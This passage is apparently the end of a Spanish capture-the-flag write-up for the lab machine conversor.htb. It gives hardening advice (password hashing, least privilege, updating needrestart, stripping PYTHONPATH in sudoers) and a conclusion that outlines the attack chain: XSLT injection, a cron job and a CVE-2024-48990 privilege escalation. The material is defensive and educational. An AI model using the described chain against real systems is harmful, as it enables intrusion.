+<p>Evitar usar MD5. Usar:</p>
+<ul>
+<li>bcrypt</li>
+<li>argon2</li>
+<li>scrypt</li>
+</ul>
+<h2><strong>4. Principio de mínimo privilegio</strong></h2>
+<ul>
+<li>El directorio <code>scripts/</code> no debe ser escribible por www-data</li>
+<li>needrestart no debe ejecutarse vía sudo por usuarios no privilegiados</li>
+</ul>
+<h2><strong>Parchear CVE-2024-48990</strong></h2>
+<p>Actualizar needrestart a una versión corregida:</p>
+<pre><code class="language-bash">apt update &amp;&amp; apt install needrestart
+</code></pre>
+<h2><strong>Remover PYTHONPATH del entorno en procesos privilegiados</strong></h2>
+<p>En sudoers:</p>
+<pre><code class="language-bash">Defaults env_delete+=PYTHONPATH
+</code></pre>
+<h1><strong>Conclusión</strong></h1>
+<p>La máquina <strong>conversor.htb</strong> demuestra una cadena de ataque muy realista que combina malas configuraciones, vulnerabilidades del lado del servidor y errores de seguridad modernos. La explotación pivota desde un servicio web vulnerable hasta el compromiso total del sistema mediante un cron job mal diseñado y una escalada de privilegios basada en CVE-2024-48990.</p>
+<p>Esta experiencia evidencia la importancia de:</p>
+<ul>
+<li>Implementar controles de seguridad en transformaciones XSLT</li>
+<li>No permitir que procesos automatizados ejecuten archivos sin validación</li>
+<li>Almacenar contraseñas de forma segura</li>
+<li>Actualizar continuamente herramientas del sistema</li>
+<li>Configurar correctamente sudo y las variables del entorno</li>
+</ul>
+<p>El ataque refleja cómo múltiples fallos pequeños pueden encadenarse para producir una toma total del sistema.</p>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
